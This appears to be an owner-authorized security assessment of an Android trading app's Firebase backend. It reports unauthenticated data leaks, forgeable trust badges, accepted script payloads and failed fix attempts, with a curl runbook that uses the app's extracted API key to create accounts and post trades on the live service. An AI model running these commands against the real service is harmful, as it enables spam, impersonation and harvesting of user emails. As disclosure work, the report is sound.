# Elvebredd — Security Findings (short summary)

App: `ccom.ilvasni.Elvebredd` v5.2.15 (Android) · Firebase project `elvi-46c1b`
Method: pulled APK from emulator, decompiled (jadx), live Firebase REST probing with the public API key baked into the app. Date: 2026-06-17. Re-tested: 2026-06-18.

## ⏱️ Re-test log
- **2026-06-18** — owner deployed a fix, re-ran the off-device trade-creation flow. **STILL VULNERABLE — fix did not take.**
  - `accounts:signUp` off-device → **HTTP 200** (open self-signup still on)
  - POST trade as username `ahaha` → **HTTP 200**, created live → doc `gop3sa3WqEIBHlTYIZR9`
  - read it back with no auth → **HTTP 200** (F1 still open)
  - **Likely cause:** fix only touched Firestore *rules*; writes are owner-scoped so an attacker who signs up and writes their *own* doc passes those rules. The root enabler is **App Check (F3)** — only Play Integrity enforcement blocks off-device REST. Also check rules were actually deployed (`firebase deploy --only firestore:rules`) and App Check is in *enforced*, not *monitor*, mode.
- **2026-06-18 (run #3)** — re-tested after second fix attempt. **STILL VULNERABLE.**
  - signup → **200** ; POST trade as `HackerTest3` → **200**, doc `YUmYkiuVt4sYJ9mhX522` ; **unauth read → 200**.
  - The unauth-read **200** proves the tightened Firestore rules are NOT in effect on project `elvi-46c1b` — either not deployed (`firebase deploy --only firestore:rules`) or deployed to the wrong project. AND rules alone can't stop *create* (attacker writes own doc). **App Check enforcement (ship app build w/ Play Integrity provider → Console set Firestore to Enforced, not Monitor) is the only thing that stops the off-device create.**

## 🔴 Most important: trades can be created from OUTSIDE the app
Using only the public API key (extracted from the APK) + open self-signup, I:
1. Registered a fresh account via REST (`accounts:signUp`) — no app, no device.
2. POSTed a fully-formed trade to Firestore REST → it appeared live in the app's marketplace.
   - Test trade left live for verification → username **`ClaudeSecTest`**, doc `6hG5KgMZcGfQkewwCvNn` (DELETE THIS).
3. Read it back unauthenticated → confirmed visible to all users.

**Why it matters:** an attacker can script `register → post trade → repeat` to flood the marketplace
with scam/spam listings — no app, no human, no visible rate limit. (Writes are owner-scoped, so this
is NOT a tamper bug; it's a spam/abuse vector enabled by: open read + open signup + no App Check.)

## Vulnerabilities
- **F1 (HIGH)** `trades` collection is **readable with NO login** → leaks `ownerEmail` + Roblox IDs.
  Measured: 300 docs/page, 220 real emails, 275 distinct users.
- **F2 (HIGH)** `users` collection is **readable by any logged-in user** → leaks `email`, `fcmToken`, Roblox IDs.
- **F3 (MED)** **Firebase App Check not enforced** — raw REST calls (like above) succeed. This is the root enabler.
- **F4 (MED)** API key not restricted in Google Cloud Console (lock to package + SHA-1).
- **F9 (MED)** Automated trade/spam injection (the "create from outside" thing above).
- **F10 (HIGH/MED)** **No server-side input validation on `trades`** (tested 2026-06-18, all variants HTTP 200, docs deleted after). Rules check ownership only, never data validity:
  - **Type confusion** — `myScore` as string `"HACKED"`, negative/huge numbers, `myOffer` as object not array → accepted. Risk: malformed *public* doc can crash the trade feed for all users (client-side DoS on render).
  - **Fake trust badges** — self-set `ownerIsRobloxVerified=true`, `ownerIsPro=true` → accepted. Scam credibility.
  - **Reputation inflation** — `ownerAcceptedTradesCount=9,900,000` → accepted.
  - **Impersonation** — `ownerRobloxUsername="Roblox"`, `ownerRobloxUserId=1`, `ownerEmail="admin@elvebredd.net"` → accepted.
  - **Stored injection** — `<script>`/`onerror` HTML in `description` → stored (stored-XSS if ever shown in a WebView / admin panel / WP site); 60 KB description → accepted (bloat).
  - **Schema pollution** — arbitrary `isAdmin`/`role`/`injectedBalance` fields → accepted (no field allowlist).
  - **Fix:** field allowlist (`keys().hasOnly([...])`) + type/range checks in rules; make trust/identity fields (`ownerIsRobloxVerified`, `ownerIsPro`, `ownerAcceptedTradesCount`, `ownerRobloxUsername/UserId`) server-authoritative via Cloud Function or `get(/users/$uid)` cross-check; cap `description` length. App Check still required to stop off-device writes.

## 🔴 F11 (HIGH) — Forgeable "verified" badge + unvalidated own-profile writes (CONFIRMED 2026-06-18)
Writing to your OWN `users/{uid}` doc accepts ANY field, no validation. Set `isRobloxVerified=true`,
`isPro=true`, `isAdmin=true`, `acceptedTradesCount=999999` → all stored (HTTP 200).
- Decompiled code: app sets `isRobloxVerified` **client-side** in the Roblox-verification flow
  (writes `{isRobloxVerified, verificationCode}` directly to Firestore) → verification is client-trusted = forgeable.
- `isRobloxVerified` is read in `UserProfile`, **chat participantInfo**, and **status posts** → forged ✓ badge
  shows across marketplace AND chat → high-credibility scams/impersonation.
- `acceptedTradesCount` self-settable → fake reputation. `isAdmin`/`isPro` stored but no consumer found today
  (latent risk: no field allowlist).
- Makes the "cross-check trust against users doc" fix in F10 useless (user controls that doc too).
- **Fix:** verify Roblox ownership in a **Cloud Function** (read Roblox profile, check `verificationCode`, then set
  `isRobloxVerified`); rules must forbid client changes to `isRobloxVerified`/`acceptedTradesCount`/`isPro`/`isAdmin`
  (compare `request.resource.data.X == resource.data.X` / block via `diff().affectedKeys()`).

## 🟡 F12 (LOW/MED) — WordPress backend: directory listing + stray dev file (checked 2026-06-18)
Chart/history data source: `https://elvebredd.net/wp-content/plugins/elvebredd-adoptme-calculator/data And history for app.json`
(13 MB, 3391 pets, each with 87-point `{date,D,FR,N,M}` time series) + `amvgg.json`. Public read-only reference data — data itself is fine.
- **Directory listing ENABLED** on the plugin folder → browsable file index; exposes leftover `my-acutal-site-code-in-html.txt`
  (53 KB front-end HTML/CSS/JS, served as text/plain). Scanned: **no secrets/keys/creds/endpoints** — not a secret leak, but sloppy.
- **Fix:** `Options -Indexes` (or blank `index.php`) + delete the stray `.txt`.
- **Cost/perf:** both JSON files served `cf-cache-status: DYNAMIC` (uncached) → 13 MB from origin per cache-miss. Add `Cache-Control` + Cloudflare edge cache rule (changes ~daily); ensure gzip/brotli.
- **Good:** WP user enumeration blocked (`/wp-json/`→401, `?author=1`→404); plugin PHP source not disclosed.

## Verified SAFE (not findings)
- All **writes/deletes are owner-scoped**: can't edit/delete/forge another user's trade or user doc.
- No "delete whole collection" is possible (rules + no bulk API).
- RTDB root read = `401`, Storage list = `403`, **Storage authed upload = `403`** (all locked).
- **Email enumeration protected** — `createAuthUri` leaks nothing; sign-in returns uniform `INVALID_LOGIN_CREDENTIALS`.
- No cleartext traffic, no TLS bypass, lean permissions, no debuggable, no custom exported components.

## Live test artifacts still up (per owner request, delete after verifying)
- Crash-test trades (malformed-data render test): usernames `CrashStr` `4QrpfRJ1Nct6aiYVPh8F`-style docs
  `JUH4LU9l6UKzpLAS4iDw` (CrashStr), `4QrpfRJ1Nct6aiYVPh8F` (CrashArr), `3mcfVwnKlKYZ7SxoZOy4` (CrashNull).
- Earlier proof trades: `6hG5KgMZcGfQkewwCvNn` (ClaudeSecTest), `gop3sa3WqEIBHlTYIZR9` (ahaha), `YUmYkiuVt4sYJ9mhX522` (HackerTest3).

## 🔁 Reproduction runbook (off-device trade creation)
Re-run this any time to confirm whether the bug is still live. Owner-authorized test only.

Constants (public client values, extracted from APK `out/resources/res/values/strings.xml`):
- API key: `AIzaSyBAh1e1RU_yrW3Xr8Uw-biKymfhau2OloU`
- Project: `elvi-46c1b` · App id: `1:694048860419:android:751bdb7e2134ecee6fa136`
- Collection: `trades`

```bash
KEY="AIzaSyBAh1e1RU_yrW3Xr8Uw-biKymfhau2OloU"; PROJ="elvi-46c1b"
EMAIL="sectest_$(date +%s)@example.com"; PASS="TestPass123!"; UNAME="ahaha"

# 1) Register a fresh account off-device (anonymous signup is disabled → ADMIN_ONLY_OPERATION; use email/password)
BODY=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${KEY}" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${EMAIL}\",\"password\":\"${PASS}\",\"returnSecureToken\":true}")
IDTOKEN=$(echo "$BODY" | grep -oE '"idToken": *"[^"]*"' | head -1 | sed -E 's/"idToken": *"//; s/"$//')
LOCALID=$(echo "$BODY" | grep -oE '"localId": *"[^"]*"' | head -1 | sed -E 's/"localId": *"//; s/"$//')

# 2) POST a trade as that user (minimal valid doc — full schema in the curl below)
NOW=$(date -u +%Y-%m-%dT%H:%M:%SZ)
curl -s -w "\nHTTP %{http_code}\n" -X POST \
  "https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/trades?key=${KEY}" \
  -H "Authorization: Bearer ${IDTOKEN}" -H "Content-Type: application/json" \
  -d "{\"fields\":{\"ownerUid\":{\"stringValue\":\"${LOCALID}\"},\"ownerRobloxUsername\":{\"stringValue\":\"${UNAME}\"},\"ownerRobloxUserId\":{\"integerValue\":\"1\"},\"ownerEmail\":{\"stringValue\":\"${EMAIL}\"},\"ownerAvatarUrl\":{\"stringValue\":\"\"},\"ownerIsOnline\":{\"booleanValue\":true},\"ownerIsRobloxVerified\":{\"booleanValue\":false},\"ownerAcceptedTradesCount\":{\"integerValue\":\"0\"},\"ownerLastActiveAt\":{\"timestampValue\":\"${NOW}\"},\"createdAt\":{\"timestampValue\":\"${NOW}\"},\"status\":{\"stringValue\":\"open\"},\"unitMode\":{\"stringValue\":\"value\"},\"description\":{\"stringValue\":\"SECURITY TEST (authorized) - safe to delete\"},\"myScore\":{\"doubleValue\":1000},\"theirScore\":{\"doubleValue\":1000},\"myOffer\":{\"arrayValue\":{\"values\":[{\"mapValue\":{\"fields\":{\"petName\":{\"stringValue\":\"Test Dragon\"},\"rarity\":{\"stringValue\":\"Legendary\"},\"value\":{\"integerValue\":\"1000\"},\"image\":{\"stringValue\":\"\"},\"tags\":{\"arrayValue\":{}}}}}]}},\"theirOffer\":{\"arrayValue\":{\"values\":[{\"mapValue\":{\"fields\":{\"petName\":{\"stringValue\":\"Test Unicorn\"},\"rarity\":{\"stringValue\":\"Legendary\"},\"value\":{\"integerValue\":\"1000\"},\"image\":{\"stringValue\":\"\"},\"tags\":{\"arrayValue\":{}}}}}]}}}}"
```

Reading the result:
- **HTTP 200** on the trade POST = bug still live (doc was created; `name` field holds the new doc id).
- **HTTP 403 `PERMISSION_DENIED`** or an App Check rejection = fix worked.
- Verify unauth read: `curl -s -w "\nHTTP %{http_code}\n" "https://firestore.googleapis.com/v1/projects/elvi-46c1b/databases/(default)/documents/trades/<DOC_ID>?key=${KEY}"` — 200 with no auth header means F1 still open.

Required trade fields (schema) and minimal-doc variant are preserved at `/tmp/elvebredd_sec/` (`trade.json`, `ahaha_trade.json`, `crt.json`).

## Fixes (priority order)
1. **Enforce App Check (Play Integrity)** — kills off-device REST automation (fixes F3 + F9 root cause).
2. `trades`: `allow read: if request.auth != null;` AND stop storing `ownerEmail` in trade docs (use `ownerUid`).
3. `users`: `allow read: if request.auth != null && request.auth.uid == uid;` (own doc only); move `email`/`fcmToken` to a private doc.
4. Restrict API key (package + SHA-1, limit APIs); add server-side rate-limit on trade creation.

> All probing used clearly-marked test data. Two test trades are intentionally **left live** (not deleted)
> as proof artifacts / for re-test reference:
> - `6hG5KgMZcGfQkewwCvNn` — username `ClaudeSecTest` (first run, 2026-06-17)
> - `gop3sa3WqEIBHlTYIZR9` — username `ahaha` (re-test, 2026-06-18)
>
> Throwaway signup accounts linger in Firebase Auth — removable only via console / Admin SDK, not the public REST key.
> Delete all of the above once the fix is verified.
